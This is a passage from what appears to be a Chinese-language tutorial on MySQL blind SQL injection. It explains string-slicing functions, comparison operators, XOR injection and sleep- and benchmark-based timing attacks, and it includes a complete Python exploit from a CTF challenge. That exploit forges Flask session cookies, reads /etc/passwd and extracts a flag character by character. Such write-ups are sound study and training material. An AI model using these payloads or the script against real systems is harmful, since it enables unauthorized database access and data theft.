使用方法：`binary 目标字符串 regexp 正则`
但是直接`字符串 regexp
正则表达式`是大小写不敏感的，需要大小写敏感需要加上`binary`关键字（`binary`不是`regexp`的搭档，需要把`binary`加到字符串的前面而不是`regexp`的前面，MySQL中`binary`是一种字符串类型）：
**rlike**
和`regexp`一样。
**trim()**
####  注入方法
`trim()`函数除了用于移除首尾空白外，还有如下用法：
`TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM str)`
表示移除`str`这个字符串首尾（BOTH）/句首（LEADING）/句尾（TRAILING）的`remstr`
例如`trim(leading 'a' from 'abcd')`表示移除`abcd`句首的`a`， 于是会返回`bcd`
利用`TRIM`进行字符串截取比较复杂，在讲解之前我们需要明确一个点：例如`trim(leading 'b' from
'abcd')`会返回`abcd`，因为这句话意思是移除abcd句首的b，但是abcd并不以b为句首开头，所以`trim`函数相当于啥也没干。
为了讲解，这里我用`i`来表示一个字符，例如`i`如果表示`a`，那么`i+1`就表示`b`，`i+2`就表示`c`。注入时，需要进行2次判断，使用4个`trim`函数。第一次判断：
    SELECT TRIM(LEADING i FROM (select database())) = TRIM(LEADING i+1 FROM (select database()));
我们知道`select database()`结果为`college`，比如现在`i`表示`a`，那么`i+1`就表示`b`，则`trim(leading
'a' from 'college')`和`trim(leading 'b' from
'college')`都返回`college`（因为college不以a也不以b为开头），那么这个`TRIM() =
TRIM()`的表达式会返回1。也就是说如果这个第一次判断返回真了，那么表示i和i+1都不是我们想要的正确结果。反之，如果这个`TRIM() =
TRIM()`的表达式返回了0，那么`i`和`i+1`其中一个必是正确结果，到底是哪个呢？我们进行二次判断：
    SELECT TRIM(LEADING i+2 FROM (select database())) = TRIM(LEADING i+1 FROM (select database()));
在第二次判断中，`i+2`和`i+1`做比较。如果第二次判断返回1，则表示`i+2`和`i+1`都不是正确结果，那么就是`i`为正确结果；如果第二次判断返回0，则表示`i+2`和`i+1`其中一个是正确结果，而正确结果已经锁定在`i`和`i+1`了，那么就是`i+1`为正确结果。这是通用的方法，一般写脚本时，因为循环是按顺序来的，所以其实一次判断就能知道结果了，具体大家自己写写脚本体会一下就明白了。
当我们判断出第一位是`'c'`后，只要继续这样判断第二位，然后第三位第四位..以此类推：
    SELECT TRIM(LEADING 'ca' FROM (select database())) = TRIM(LEADING 'cb' FROM (select database()));
    SELECT TRIM(LEADING 'cb' FROM (select database())) = TRIM(LEADING 'cc' FROM (select database()));
    SELECT TRIM(LEADING 'cc' FROM (select database())) = TRIM(LEADING 'cd' FROM (select database()));
    ......
**使用trim的例题**
第四届美团CTF初赛，EasySQL，我的EXP：
    #!/usr/bin/env python3
    #-*- coding:utf-8 -*-    #__author__: 颖奇L'Amore www.gem-love.com
    import requests as req 
    import os 
    from urllib.parse import quote
    import base64
    def getsession(username):
        def getcmd(cmd):
            cmdpfx = '''python3 ./Y1ngTools/flask-session-cookie-manager/flask_session_cookie_manager3.py encode -s 'ookwjdiwoahwphjdpawhjpo649491a6wd949awdawdada' -t '''
            return cmdpfx + f''' "{cmd}" '''
        session = "{'islogin': True, 'pic': '../../../../../../etc/passwd', 'profiles': 'Administrator user, with the highest authority to the system', 'user': 'US3RN4ME'}"
        session = session.replace('US3RN4ME', username.replace("'", "\\'"))
        res = os.popen(getcmd(session)).read()
        return res.replace('\n', '')
    def readfile(r):
        try:
            res = r.text.split('base64,')[1].split("\" width=")[0]
        except:
            print("不存在")
            exit(0)
        print(base64.b64decode(res.encode()).decode('utf-8'))
    burp0_url = "http://eci-2ze2ptl1d7s4w0vn6x9d.cloudeci1.ichunqiu.com:8888/home"
    burp0_cookies = {"Hm_lvt_2d0601bd28de7d49818249cf35d95943": "1636507075", "__jsluid_h": "c7d0c61afe2b3dd7eaeaa660783dab2d", "session": ".eJxdjEEOgzAMBL9i-YzInVufElGDLYUY2Q4IVf17A8dKe5ud-aB40VUqTmGNBtxlxgnHMf1tN52TU1kS1UNMK_av6SKFvAuv9yZVPCyHGjQnG-CUYAgmYFmZPCC3YDWJC0If4JcHbb10C72S7wp-fyh_MkQ.YbSA5Q.vuB7TdIOHJjOxeb0QJe13mBgRkw"}
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}
    def text2hex(s):
        res = ""
        for i in s:
            res += hex(ord(i)).replace("0x", "")
        return "0x" + res
    select = 'select group_concat(column_name) from information_schema.columns where table_schema=0x637466'
    select = 'select group_concat(f1aggggggg) from flagggishere'
    # f1aggggggg
    # table flagggishere
    res = 'flag{'
    for i in range(1,200):
        for ch in range(40, 128):
            payload = f"""' or trim(leading {text2hex(res+chr(ch))} from ({select}))=trim(leading {text2hex(res+chr(ch+1))} from ({select}))='1""".replace(' ', '/**/')
            burp0_cookies['session'] = getsession(payload)
            r = req.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
            try:
                if 'Who are you?' in r.text.split('''Profiles:''')[1]:
                    res += chr(ch+1)
                    print("[*] 注入成功", res)
                    break 
                else:
                    print(ch)
            except Exception as e:
                print(r.text)
            if ch == 127:
                print("[*] 注入完成")
                exit(0)
**insert()**
虽然字面意思为插入，其实是个字符串替换的函数！
用法：`insert(字符串，起始位置，长度，替换为什么)`
在进行字符串截取时，可以实现精确到某一位的截取，但是要对其进行变换，具体原理大家可以自己分析，这里直接给出使用方法：
    SELECT insert((insert(目标字符串,1,截取的位数,'')),2,9999999,''); # 这里截取的位数从0开始数
使用`INSERT()`进行注入的exp脚本可以看后面报错盲注的例题。
###  比较方法
**=> = 下界 && exp <= 上界`，有点像数学里的“闭区间”，只是这里的上下界可以相等，比如expr是2，那么你没必要写`2
between 1 and 3`，完全可以写成`2 between 2 and 2`。所以`x between i and
i`就是表示`x是否等于i`的意思。
**IN**
用法：`expr1 in (expr1, expr2, expr3)`
说明：有点像数学中的元素是否属于一个集合。同样也是大小写不敏感的，为了大小写敏感需要用`binary`关键字。
示例：
**AND和减法运算**
`and` 也可以用`&&`来表示，是逻辑与的意思。
在盲注中，可以用一个true去与运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码：
**OR和减法运算**
`or` 也可以用`||`来表示，是逻辑或的意思。
在盲注中，可以用一个false去或运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码：
**异或注入**
虽然也可以做比较，比如：
但是异或更多应用在不能使用注释符的情况下。注入时，SQL语句为`SELECT xx FROM yy WHERE zz =
'$your_input';`因为用户的输入后面还有一个单引号，很多时候我们使用`#`或者`--`直接注释掉了这个单引号，但是如果注释符被过滤了，那么这个单引号就必须作为SQL语句的一部分，这时可以这样做：
    WHERE zz = 'xx' or '1'^(condition)^'1';
而对于`'1'^(condition)^'1'`这个异或表达式，如果condition为真则返回真，condition为假就返回假
上面开始时讲的盲注的步骤，找到这个condition后，我们只要将condition换成具体的注入语句(也就是字符串截取与比较的语句)就可以了。所以异或的好处是：能够让你自由的进行截取和比较，而不需要考虑最后的单引号，因为异或帮你解决了最后的单引号。
在没有注释符的情况下，除了异或，还可以用连等式、连减法式等等！根据运算中condition返回的0和1进行构造就行了。
**CASE**
两种用法：
    CASE WHEN (表达式) THEN exp1 ELSE exp2 END; # 表示如果表达式为真则返回exp1，否则返回exp2
    CASE 啥 WHEN 啥啥 THEN exp1 ELSE exp2 END; # 表示如果(啥=啥啥)则返回exp1，否则返回exp2
CASE一般不用来做比较，而是构造条件语句，在时间盲注中更能用到！
## 0x05 延时盲注
###  基本利用-sleep
**基础利用**
用法：`sleep(延时的秒数)`
一般情况下，使用`if`或`case`构造条件表达式进行延时：
    if((condition), sleep(5), 0);
    CASE WHEN (condition) THEN sleep(5) ELSE 0 END;
**无if和case的解决办法**
假设`if`和`case`被ban了，又想要根据condition的真假来决定是否触发`sleep()`，可以将condition整合进`sleep()`中，做乘法即可:
    sleep(5*(condition))
如果condition为真则返回1，`5*(condition)`即`5*1`为5，延时5秒；如果condition为假则返回0，`5*(condition)`即`5*0`为0，延时0秒。
###  Bypass方法
**benchmark**
是替代`sleep`的首选。
用法：`benchmark(执行多少次，执行什么操作)`
通过修改执行的次数和执行的操作(比如`sha1(sha1(sha1(sha1())))`这样多套几层)，可以精准控制延时时间。